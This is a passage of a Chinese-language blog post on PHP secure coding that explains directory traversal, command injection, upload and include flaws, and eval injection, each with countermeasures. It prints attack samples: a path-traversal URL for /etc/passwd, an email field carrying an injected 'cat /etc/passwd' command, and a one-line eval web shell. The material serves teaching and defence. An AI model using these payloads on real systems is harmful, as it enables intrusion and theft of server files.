+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$token</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$token</span> || <span class="variable">$token</span> != <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]) <span class="keyword">die</span>(<span class="string">&#x27;Token 验证失败&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="文件处理相关"><a href="#文件处理相关" class="headerlink" title="文件处理相关"></a>文件处理相关</h2><p>在有些Web应用中, 可以通过外接传入参数的方式来指定服务器中的文件名, 如指定模板. 可能造成以下风险</p>
+<ul>
+<li>目录遍历  非法访问服务器文件</li>
+<li>OS命令注入  调用OS命令</li>
+</ul>
+<h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><p>Web应用允许外界以参数形式指定服务器文件名时, 如果没有进行充分校验, 可能造成文件被浏览、篡改或删除. </p>
+<p>可能造成以下<strong>影响</strong>:</p>
+<ul>
+<li>浏览Web服务器中的文件<ul>
+<li>泄露重要信息</li>
+</ul>
+</li>
+<li>篡改/删除服务器文件<ul>
+<li>篡改网页文件内容</li>
+<li>删除脚本文件或配置文件导致宕机</li>
+<li>通过篡改脚本文件在服务器上执行任意脚本</li>
+</ul>
+</li>
+</ul>
+<p>要<strong>防范</strong>目录遍历漏洞, 有如下方式(多选一):</p>
+<ul>
+<li>避免由外界指定文件名</li>
+<li>文件名中不允许包含目录</li>
+<li>限定文件名中仅包含数字和字母</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>允许外界以参数形式指定服务器文件名的页面</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>Web应用的所有页面</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>泄露隐私信息、篡改删除信息、执行脚本、宕机</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>- 避免由外界指定文件名 <br />- 文件名中不允许包含目录 <br />- 限定文件名中仅包含数字和字母</td>
+</tr>
+</tbody></table>
+<p><strong>攻击案例</strong></p>
+<ul>
+<li><p>1.目标页面</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9f22cd09732fb15d8c36279ccc5a38d2-63712fe.png" alt="image-20220910103711569"></p>
+</li>
+<li><p>2.请求参数变更</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://local2.project.com/?tpl=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b707e8b80910f90b56c78bbb381868d6-da8b2bd.png" alt="image-20220910103756231"></p>
+</li>
+</ul>
+<p><strong>对策</strong></p>
+<p>实施以下任一项:</p>
+<ul>
+<li><p>避免由外界指定文件名</p>
+<ul>
+<li>固定文件名</li>
+<li>将文件名保存在会话变量中</li>
+<li>不直接指定文件名, 而是使用编号的间接指定</li>
+</ul>
+</li>
+<li><p>文件名中不允许包含目录</p>
+<ul>
+<li>```php<br>$tpl = basename($_GET[‘tpl’]);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 限定文件名中仅包含数字和字母</span><br><span class="line"></span><br><span class="line">  - ```php</span><br><span class="line">    if (!preg_match(&#x27;/\A[a-z0-9]+\.html\z/ui&#x27;, $tpl))&#123;</span><br><span class="line">        die(&#x27;tpl仅能使用数字和字母&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="内部文件被公开"><a href="#内部文件被公开" class="headerlink" title="内部文件被公开"></a>内部文件被公开</h3><p>Web服务器中的公开目录有时会防止对外保密的文件. 外界一旦得知文件URL, 就能浏览内部文件, 所以, 一般不在公开目录中放置内部文件, 或直接禁用目录列表功能</p>
+<table>
+<thead>
+<tr>
+<th>对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>产生地点</td>
+<td>网站全体</td>
+</tr>
+<tr>
+<td>影响范围</td>
+<td>仅限于被公开文件</td>
+</tr>
+<tr>
+<td>影响类型</td>
+<td>泄露隐私信息</td>
+</tr>
+<tr>
+<td>影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td>用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td>对策概要</td>
+<td>不在公开目录中放置内部文件, 或直接禁用目录列表功能</td>
+</tr>
+</tbody></table>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8d69192c8659a05f764663bbee36d5a3-a50b9d8.png" alt="image-20220910104559023"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Apache中编辑httpd.conf禁用目录列表</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  ServerName ni9ne.com.cn</span><br><span class="line">  DocumentRoot &quot;D:/wamp64/www/test/WebSecure/web&quot;</span><br><span class="line">  &lt;Directory  &quot;D:/wamp64/www/test/WebSecure/web/&quot;&gt;</span><br><span class="line">    Options +Includes +FollowSymLinks +MultiViews # 去除[+Indexes]配置</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="调用OS命令相关问题"><a href="#调用OS命令相关问题" class="headerlink" title="调用OS命令相关问题"></a>调用OS命令相关问题</h2><p>Web开发中, 大部分语言都支持通过shell执行OS(操作系统)命令. 当编码时通过shell执行OS命令或某个方法内部使用shell. 就可能出现OS命令被任意执行的情况, 即<strong>OS命令注入</strong></p>
+<h3 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h3><ul>
+<li><p>1.目标页面 发送邮件</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3e5962f26bed8d553ec9f17d6cafe24c-a12ac4f.png" alt="image-20220910121843511"></p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ffefa6eb6c260615b3202617cfebb36-8757277.png" alt="image-20220910121913823"></p>
+</li>
+<li><p>2.输入注入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ni9ne@outlook.com;cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbbd0b8d784c15b58a0f80955acfbc96-fbe6d36.png" alt="image-20220910122023301"></p>
+</li>
+</ul>
+<p><strong>OS注入产生原因</strong> </p>
+<p>使用Shell来启动命令, 同时也意味着可以使用连续命令, 管道符, 重定向等功能</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># php 执行代码</span><br><span class="line">system(&quot;echo hello &gt; a.txt&quot;);</span><br><span class="line"># 相当于Shell执行</span><br><span class="line">sh -C echo hello &gt; a.txt</span><br></pre></td></tr></table></figure>
+
+<p>如果指定OS命令参数字符串中混入了Shell的元字符, 就会导致攻击者添加的OS命令被执行. 即满足OS注入漏洞的条件包括:</p>
+<ul>
+<li>使用了内部调用Shell的函数 (system open等)</li>
+<li>将外界传入参数传递给内部调用Shell的函数</li>
+<li>参数中Shell的元字符没有被转义</li>
+</ul>
+<p><strong>对策</strong></p>
+<p>为了防范OS命令注入, 可以使用以下方法:</p>
+<ul>
+<li><p>选择不调用OS命令的实现方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_send_mail(<span class="variable">$to</span>, <span class="variable">$content</span>, <span class="string">&#x27;From: xxx@qq.com&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
+<li><p>不将外界输入的字符串传递给命令行参数</p>
+<p>不将字符传放入命令, 而是通过指定消息头的方式, 由命令自行读取参数</p>
+</li>
+<li><p>使用安全的函数对参数进行转义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg();</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="文件上传问题"><a href="#文件上传问题" class="headerlink" title="文件上传问题"></a>文件上传问题</h2><h3 id="针对上传的DOS攻击"><a href="#针对上传的DOS攻击" class="headerlink" title="针对上传的DOS攻击"></a>针对上传的DOS攻击</h3><p>使用上传功能连续发送体积巨大的文件, 可能形成网站负荷过载的<strong>DOS攻击</strong>(Denial of service Attack)</p>
+<p>防范DOS攻击的一种有效策略为限制上传文件的容量. </p>
+<p>PHP中的php.ini文件限制:</p>
+<table>
+<thead>
+<tr>
+<th>设置项目</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file_uploads</td>
+<td>是否允许使用文件上传</td>
+<td>On</td>
+</tr>
+<tr>
+<td>upload_max_filesize</td>
+<td>单个文件最大容量</td>
+<td>2MB</td>
+</tr>
+<tr>
+<td>max_file_uploads</td>
+<td>单次请求最大文件上传个数</td>
+<td>20</td>
+</tr>
+<tr>
+<td>post_max_size</td>
+<td>POST包最大限制</td>
+<td>8MB</td>
+</tr>
+<tr>
+<td>memory_limit</td>
+<td>脚本最大申请内存</td>
+<td>128MB</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p> Apache/Nginx中也有类似的配置项目</p>
+</blockquote>
+<h3 id="上传执行脚本"><a href="#上传执行脚本" class="headerlink" title="上传执行脚本"></a>上传执行脚本</h3><p>有些文件上传处理会将用户上传的文件保存至Web服务器的公开目录中. 如果上传了php、asp、aspx、jsp等脚本文件, 用户就可以在服务器上执行脚本, 造成与OS命令注入同样的影响</p>
+<p>为了防范上传脚本, 可以使用以下方法:</p>
+<ul>
+<li>不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现</li>
+<li>将文件的扩展名限定为不可执行的文件</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">产生地点</td>
+<td>提供文件上传的页面</td>
+</tr>
+<tr>
+<td align="left">影响范围</td>
+<td>所有页面</td>
+</tr>
+<tr>
+<td align="left">影响类型</td>
+<td>泄露隐私信息、篡改删除数据、对外发动DOS攻击的</td>
+</tr>
+<tr>
+<td align="left">影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td align="left">用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td align="left">对策概要</td>
+<td>- 不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现 <br />- 将文件的扩展名限定为不可执行的脚本文件</td>
+</tr>
+</tbody></table>
+<p><strong>恶意脚本</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><strong>对策</strong></p>
+<ul>
+<li><p>校验上传文件类型</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配后缀</span></span><br><span class="line"><span class="variable">$allowType</span> = [<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"><span class="variable">$allowHeader</span> = [];</span><br><span class="line"><span class="variable">$extension</span> = strtolower(pathinfo(<span class="variable">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$extension</span>, <span class="variable">$allowType</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件格式不允许上传&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 匹配字节头</span></span><br><span class="line"><span class="variable">$allowHeader</span> = [IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG];</span><br><span class="line"><span class="variable">$type</span> = getimagesize(<span class="variable">$filename</span>)[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$type</span>, <span class="variable">$allowHeader</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件格式不允许上传&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="诱使用户下载恶意文件"><a href="#诱使用户下载恶意文件" class="headerlink" title="诱使用户下载恶意文件"></a>诱使用户下载恶意文件</h3><h2 id="include相关问题"><a href="#include相关问题" class="headerlink" title="include相关问题"></a>include相关问题</h2><p>PHP等脚本语言能够从外部文件读取脚本源代码的一部分. 对应的关键字包括 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> ;  <span class="keyword">require_once</span> ; <span class="keyword">include</span> ; <span class="keyword">include_once</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>如果外界能够制定include的对象文件名, 就可能造成意料之外的文件被include而遭受攻击. 即文件包含漏洞. 在PHP的配置中, 还能开启配置, 可以指定外部服务器的URL作为包含文件, 可能存在远程文件包含风险(RFI)</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php.ini</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="string">Off</span></span><br></pre></td></tr></table></figure>
+
+<p>为了防范文件包含漏洞, 可以采取以下措施:</p>
+<ul>
+<li>避免include的路径中包含外界传入的参数</li>
+<li>include路径包含参数时, 限制字符种类仅为数字和字母</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">产生地点</td>
+<td>include读取脚本的页面</td>
+</tr>
+<tr>
+<td align="left">影响范围</td>
+<td>所有页面</td>
+</tr>
+<tr>
+<td align="left">影响类型</td>
+<td>泄露隐私信息、篡改删除数据、对外发动DOS攻击的</td>
+</tr>
+<tr>
+<td align="left">影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td align="left">用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td align="left">对策概要</td>
+<td>- 避免include的路径中包含外界传入的参数<br />- include路径包含参数时, 限制字符种类仅为数字和字母</td>
+</tr>
+</tbody></table>
+<h2 id="eval相关问题"><a href="#eval相关问题" class="headerlink" title="eval相关问题"></a>eval相关问题</h2><p>如果eval 函数使用不当, 可能导致外界传入脚本被执行, 即<strong>eval注入攻击</strong> </p>
+<p>为避免出现风险, 可采取以下措施:</p>
+<ul>
+<li>不使用eval或eval相当的功能</li>
+<li>避免eval的参数包含外界传入的参数</li>
+<li>eval参数中包含外界传入参数时, 校验参数, 限定为仅含数字字母 </li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">对象</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">产生地点</td>
+<td>使用eval或eval相当的功能的页面</td>
+</tr>
+<tr>
+<td align="left">影响范围</td>
+<td>所有页面</td>
+</tr>
+<tr>
+<td align="left">影响类型</td>
+<td>泄露隐私信息、篡改删除数据、对外发动DOS攻击的</td>
+</tr>
+<tr>
+<td align="left">影响程度</td>
+<td>大</td>
+</tr>
+<tr>
+<td align="left">用户参与程度</td>
+<td>不需要</td>
+</tr>
+<tr>
+<td align="left">对策概要</td>
+<td>- 不使用eval或eval相当的功能<br />- 避免eval的参数包含外界传入的参数<br />- eval参数中包含外界传入参数时, 限定为仅含数字字母</td>
+</tr>
+</tbody></table>
+<h2 id="发送邮件问题"><a href="#发送邮件问题" class="headerlink" title="发送邮件问题"></a>发送邮件问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Apache中编辑httpd.conf</span><br><span class="line">  &lt;Directory  &quot;D:/wamp64/www/test/WebSecure/web/&quot;&gt;</span><br><span class="line">    Options +Includes +FollowSymLinks +MultiViews # 去掉+Indexes配置</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">  &lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>NI9NE
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://ni9ne.github.io/2022/08/22/%E5%AE%89%E5%85%A8/PHP%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB/" title="PHP编码安全及常见攻击">https://ni9ne.github.io/2022/08/22/安全/PHP编码安全及常见攻击/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%90%8E%E7%AB%AF/" rel="tag"># 后端</a>
+              <a href="/tags/%E9%A1%B9%E7%9B%AE/" rel="tag"># 项目</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/12/MySql/MySQL%E8%BF%90%E7%BB%B4/" rel="prev" title="MySQL高可用">
+                  <i class="fa fa-chevron-left"></i> MySQL高可用
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">NI9NE</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+
+
+
+
+
+</body>
+</html>
